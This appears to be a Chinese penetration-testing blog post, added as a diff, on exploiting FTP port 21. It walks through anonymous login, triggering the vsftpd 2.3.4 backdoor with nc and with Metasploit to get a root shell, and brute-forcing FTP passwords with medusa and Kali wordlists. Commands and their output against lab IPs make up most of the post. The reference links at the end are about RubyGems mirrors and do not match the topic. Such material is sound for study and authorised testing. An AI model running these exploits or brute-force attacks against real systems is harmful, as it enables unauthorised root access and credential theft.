@@ -1,0 +1,193 @@
+---
+layout:     post
+title:      "21端口漏洞利用"
+subtitle:   "21端口FTP（文件传输协议）常见漏洞利用方式"
+date:       2020-03-20
+author:     "Malcolm Suen"
+header-img: "img/post-bg-2015.jpg"
+header-mask:  0.3
+catalog: true
+tags:
+    - 高危端口
+    - FTP
+    - 漏洞利用
+---
+
+## 匿名登录漏洞
+
+由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。可以使用nc连接FTP。
+
+```powershell
+ftp 10.110.1.56
+Connected to 10.110.1.56.
+220 (vsFTPd 3.0.2)
+Name (10.110.1.56:root): anonymous
+331 Please specify the password.
+Password:	#密码任意
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+```
+
+## 笑脸漏洞（vsftpd-2.3.4）
+
+当进行FTP认证时，如果用户名USER中包含:)，那么直接就触发监听6200端口的连接的shell。此漏洞只存在于2.3.4版本的vsftpd中，尝试过几个其他的版本，并没有成功。
+
+### 手动触发漏洞
+
+首先使用nc触发vsftpd-2.3.4后门漏洞
+
+```shell
+nc 10.0.2.5 21
+220 (vsFTPd 2.3.4)
+USER user:)
+331 Please specify the password.
+PASS pass
+```
+
+这时候使用nmap扫描发现6200漏洞开放了，打开另一个终端利用该漏洞
+
+```shell
+nmap -p 6200 10.x.x.x	#使用-p [端口号]可以过滤指定端口
+
+PORT     STATE SERVICE
+6200/tcp open  lm-x
+
+nc 10.0.2.5 6200
+id
+uid=0(root) gid=0(root)
+```
+
+### 使用metasploit触发漏洞
+
+```shell
+msfconsole
+msf5 > search vsftpd	#当成功启动 msfconsole 后，搜索与vsftpd相关信息
+
+Matching Modules
+================
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+   
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor 	#选择使用针对该漏洞的利用模块
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options 	#查看该模块的配置选项
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   21               yes       The target port (TCP)
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 10.x.x.x		#只需设置目标的主机的IP即可
+rhost => 10.x.x.x
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
+```
+
+## 用户名密码暴力破解
+
+使用medusa爆破，使用-d查看支持的破解模块
+
+```shell
+medusa -d
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+  Available modules in "." :
+
+  Available modules in "/usr/lib/x86_64-linux-gnu/medusa/modules" :
+
+   + cvs.mod : Brute force module for CVS sessions : version 2.0
+   + ftp.mod : Brute force module for FTP/FTPS sessions : version 2.1
+   + http.mod : Brute force module for HTTP : version 2.1
+   + imap.mod : Brute force module for IMAP sessions : version 2.0
+   + mssql.mod : Brute force module for M$-SQL sessions : version 2.0
+   + mysql.mod : Brute force module for MySQL sessions : version 2.0
+   + nntp.mod : Brute force module for NNTP sessions : version 2.0
+   + pcanywhere.mod : Brute force module for PcAnywhere sessions : version 2.0
+   + pop3.mod : Brute force module for POP3 sessions : version 2.0
+   + postgres.mod : Brute force module for PostgreSQL sessions : version 2.0
+   + rexec.mod : Brute force module for REXEC sessions : version 2.0
+   + rlogin.mod : Brute force module for RLOGIN sessions : version 2.0
+   + rsh.mod : Brute force module for RSH sessions : version 2.0
+   + smbnt.mod : Brute force module for SMB (LM/NTLM/LMv2/NTLMv2) sessions : version 2.1
+   + smtp-vrfy.mod : Brute force module for verifying SMTP accounts (VRFY/EXPN/RCPT TO) : version 2.1
+   + smtp.mod : Brute force module for SMTP Authentication with TLS : version 2.0
+   + snmp.mod : Brute force module for SNMP Community Strings : version 2.1
+   + ssh.mod : Brute force module for SSH v2 sessions : version 2.1
+   + svn.mod : Brute force module for Subversion sessions : version 2.1
+   + telnet.mod : Brute force module for telnet sessions : version 2.0
+   + vmauthd.mod : Brute force module for the VMware Authentication Daemon : version 2.0
+   + vnc.mod : Brute force module for VNC sessions : version 2.1
+   + web-form.mod : Brute force module for web forms : version 2.1
+   + wrapper.mod : Generic Wrapper Module : version 2.0
+```
+
+使用medusa暴力破解ftp
+
+```shell
+medusa -h 10.x.x.x -U /root/Desktop/User.txt -P /root/Desktop/Passwd.txt -M ftp
+#-h 指定要破解的目标
+#-U 指定用户名字典
+#-P 指定密码字典
+#-M	指定要用的模块，上文中的模块去掉.mod即可
+# 更多指令查看-h
+
+ACCOUNT CHECK: [ftp] Host: 10.x.x.x (1 of 1, 0 complete) User: admin (1 of 4, 0 complete) Password: admin (1 of 4 complete)
+…………………………
+ACCOUNT CHECK: [ftp] Host: 10.x.x.x (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: msfadmin (2 of 4 complete)
+ACCOUNT FOUND: [ftp] Host: 10.0.2.5 User: msfadmin Password: msfadmin [SUCCESS]
+```
+
+### Kali Linux中的默认字典
+
+kali默认字典目录： /usr/share/wordlists/
+可以用crunch自己选择生成适合自己的密码字典
+
+```shell
+cd /usr/share/wordlists/
+
+/usr/share/wordlists# ls
+dirb       fasttrack.txt  metasploit #各种类型的字典  rockyou.txt.gz
+dirbuster  fern-wifi      nmap.lst    wfuzz #内含模糊测试的各种字典
+
+/usr/share/wordlists/dirb# ls
+big.txt   small.txt 
+euskera.txt #数据目录字典           
+mutations_common.txt #备份扩展名
+spanish.txt #方法名或库目录
+catala.txt #项目配置字典
+extensions_common.txt #常用文件扩展名字典 
+others others #扩展目录，默认用户名等
+stress #压力测试
+common.txt #公共字典
+indexes.txt #首页字典                     
+vulns #漏洞测试
+
+/usr/share/wordlists/dirbuster# ls
+#apache用户枚举
+apache-user-enum-1.0.txt  apache-user-enum-2.0.txt  
+#目录枚举
+directories.jbrofuzz  
+#目录列表大，中，小 big，medium，small
+directory-list-1.0.txt    	
+directory-list-2.3-medium.txt	directory-list-lowercase-2.3-medium.txt
+directory-list-2.3-small.txt	directory-list-lowercase-2.3-small.txt
+
+/usr/share/wordlists/fern-wifi# ls
+common.txt	#公共wifi账户密码
+```
+
+## FTP用户名明文密码嗅探
+
+待测试
+
+
+
+> 参考资料：
+>
+> [RubyGems - Ruby China](https://gems.ruby-china.com/)
+>
+> [修改Ruby的Gem镜像](https://blog.csdn.net/hsl0530hsl/article/details/80056289)
